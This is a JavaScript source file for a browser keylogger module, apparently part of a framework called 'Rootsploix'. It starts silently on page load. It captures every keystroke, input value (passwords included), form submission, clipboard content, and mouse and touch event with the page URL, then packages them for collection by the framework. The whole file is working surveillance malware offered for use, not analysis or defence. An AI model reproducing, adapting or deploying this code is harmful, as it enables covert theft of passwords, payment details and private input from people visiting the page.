/**
 * ROOTSPLOIX UNIVERSAL KEYLOGGER & DATA COLLECTION MODULE
 * Cross-platform: iOS, Android, Windows, macOS
 * Auto-start on page load - NO USER INTERACTION REQUIRED
 */

class UniversalKeylogger {
    constructor(core) {
        this.core = core;
        this.buffer = [];
        this.formData = {};
        this.clipboardData = [];
        this.mouseTracker = [];
        this.isActive = false;
        this.targetElements = new Set();
        
        // Auto-start immediately
        this.start();
    }

    start() {
        console.log('[KEYLOGGER] 🎯 Universal Keylogger Starting...');
        
        // Cross-platform event listeners
        this.installKeyboardHooks();
        this.installMouseHooks();
        this.installFormHooks();
        this.installClipboardHooks();
        this.installTouchHooks(); // For mobile devices
        
        this.isActive = true;
        console.log('[KEYLOGGER] ✅ All hooks installed successfully');
    }

    // Keyboard Hooks - Works on all platforms
    installKeyboardHooks() {
        // Global keyboard capture
        document.addEventListener('keydown', (e) => this.captureKeydown(e), true);
        document.addEventListener('keyup', (e) => this.captureKeyup(e), true);
        document.addEventListener('keypress', (e) => this.captureKeypress(e), true);
        
        // Input field monitoring
        document.addEventListener('input', (e) => this.captureInput(e), true);
        document.addEventListener('change', (e) => this.captureChange(e), true);
    }

    captureKeydown(event) {
        const keyData = {
            type: 'keydown',
            key: event.key,
            code: event.code,
            keyCode: event.keyCode,
            timestamp: Date.now(),
            target: this.getElementInfo(event.target),
            modifiers: {
                ctrl: event.ctrlKey,
                alt: event.altKey,
                shift: event.shiftKey,
                meta: event.metaKey // Cmd key on Mac
            },
            url: window.location.href
        };

        this.buffer.push(keyData);
        
        // Special key combinations detection
        if (event.ctrlKey || event.metaKey) {
            if (event.key === 'v') {
                setTimeout(() => this.captureClipboard(), 100);
            }
        }
    }

    captureKeyup(event) {
        // Track key release for timing analysis
        this.buffer.push({
            type: 'keyup',
            key: event.key,
            timestamp: Date.now(),
            target: this.getElementInfo(event.target)
        });
    }

    captureInput(event) {
        const target = event.target;
        const value = target.value;
        
        // Capture all input including passwords
        const inputData = {
            type: 'input',
            value: value,
            inputType: target.type,
            name: target.name || target.id,
            timestamp: Date.now(),
            elementInfo: this.getElementInfo(target),
            isPassword: target.type === 'password',
            url: window.location.href
        };

        this.buffer.push(inputData);
        
        // Store form data
        const formId = this.getFormId(target);
        if (!this.formData[formId]) {
            this.formData[formId] = {};
        }
        this.formData[formId][target.name || target.id || 'unknown'] = value;
    }

    // Mouse Tracking
    installMouseHooks() {
        document.addEventListener('mousedown', (e) => this.captureMousedown(e), true);
        document.addEventListener('mouseup', (e) => this.captureMouseup(e), true);
        document.addEventListener('mousemove', (e) => this.captureMousemove(e), true);
        document.addEventListener('click', (e) => this.captureClick(e), true);
        document.addEventListener('contextmenu', (e) => this.captureContextMenu(e), true);
    }

    captureMousedown(event) {
        this.mouseTracker.push({
            type: 'mousedown',
            x: event.clientX,
            y: event.clientY,
            button: event.button,
            timestamp: Date.now(),
            target: this.getElementInfo(event.target)
        });
    }

    captureClick(event) {
        this.mouseTracker.push({
            type: 'click',
            x: event.clientX,
            y: event.clientY,
            timestamp: Date.now(),
            target: this.getElementInfo(event.target),
            url: window.location.href
        });
    }

    // Touch Events for Mobile
    installTouchHooks() {
        if ('ontouchstart' in window) {
            document.addEventListener('touchstart', (e) => this.captureTouch(e), true);
            document.addEventListener('touchend', (e) => this.captureTouch(e), true);
            document.addEventListener('touchmove', (e) => this.captureTouch(e), true);
        }
    }

    captureTouch(event) {
        const touch = event.touches[0] || event.changedTouches[0];
        if (touch) {
            this.mouseTracker.push({
                type: event.type,
                x: touch.clientX,
                y: touch.clientY,
                timestamp: Date.now(),
                target: this.getElementInfo(event.target),
                url: window.location.href
            });
        }
    }

    // Form Monitoring
    installFormHooks() {
        document.addEventListener('submit', (e) => this.captureFormSubmit(e), true);
        
        // Monitor all form elements
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {
                            this.scanForForms(node);
                        }
                    });
                }
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
        
        // Initial scan
        this.scanForForms(document);
    }

    scanForForms(element) {
        const forms = element.querySelectorAll('form, input, textarea, select');
        forms.forEach(form => {
            if (!this.targetElements.has(form)) {
                this.targetElements.add(form);
                form.addEventListener('input', (e) => this.captureInput(e), true);
                form.addEventListener('change', (e) => this.captureChange(e), true);
            }
        });
    }

    captureFormSubmit(event) {
        const form = event.target;
        const formData = new FormData(form);
        const data = {};
        
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }
        
        this.buffer.push({
            type: 'form_submit',
            action: form.action,
            method: form.method,
            data: data,
            timestamp: Date.now(),
            url: window.location.href
        });
    }

    // Clipboard Monitoring
    installClipboardHooks() {
        if (navigator.clipboard && navigator.clipboard.readText) {
            document.addEventListener('paste', () => {
                setTimeout(() => this.captureClipboard(), 100);
            }, true);
        }
    }

    async captureClipboard() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                this.clipboardData.push({
                    type: 'clipboard',
                    content: text,
                    timestamp: Date.now(),
                    url: window.location.href
                });
            }
        } catch (error) {
            // Clipboard access might be restricted
            console.log('[KEYLOGGER] Clipboard access restricted');
        }
    }

    // Utility Functions
    getElementInfo(element) {
        if (!element) return null;
        
        return {
            tagName: element.tagName,
            id: element.id,
            className: element.className,
            name: element.name,
            type: element.type,
            placeholder: element.placeholder,
            xpath: this.getXPath(element)
        };
    }

    getXPath(element) {
        if (element.id !== '') {
            return 'id("' + element.id + '")';
        }
        if (element === document.body) {
            return element.tagName;
        }

        let ix = 0;
        const siblings = element.parentNode.childNodes;
        for (let i = 0; i < siblings.length; i++) {
            const sibling = siblings[i];
            if (sibling === element) {
                return this.getXPath(element.parentNode) + '/' + element.tagName + '[' + (ix + 1) + ']';
            }
            if (sibling.nodeType === 1 && sibling.tagName === element.tagName) {
                ix++;
            }
        }
    }

    getFormId(element) {
        let form = element;
        while (form && form.tagName !== 'FORM') {
            form = form.parentElement;
        }
        return form ? (form.id || form.action || 'unknown') : 'no-form';
    }

    // Data Retrieval
    getData() {
        const data = {
            keystrokes: [...this.buffer],
            forms: {...this.formData},
            mouse: [...this.mouseTracker],
            clipboard: [...this.clipboardData],
            stats: {
                totalKeystrokes: this.buffer.length,
                totalClicks: this.mouseTracker.filter(m => m.type === 'click').length,
                formsCount: Object.keys(this.formData).length,
                clipboardCount: this.clipboardData.length
            }
        };
        
        // Clear buffers after sending
        this.buffer = [];
        this.mouseTracker = [];
        this.clipboardData = [];
        
        return data;
    }

    // Special targeting
    setTarget(target) {
        console.log(`[KEYLOGGER] Setting focus target: ${target}`);
        // Can be used to focus on specific elements or applications
    }

    stop() {
        this.isActive = false;
        console.log('[KEYLOGGER] 🛑 Keylogger stopped');
    }
}

// Export for use in core framework
window.UniversalKeylogger = UniversalKeylogger;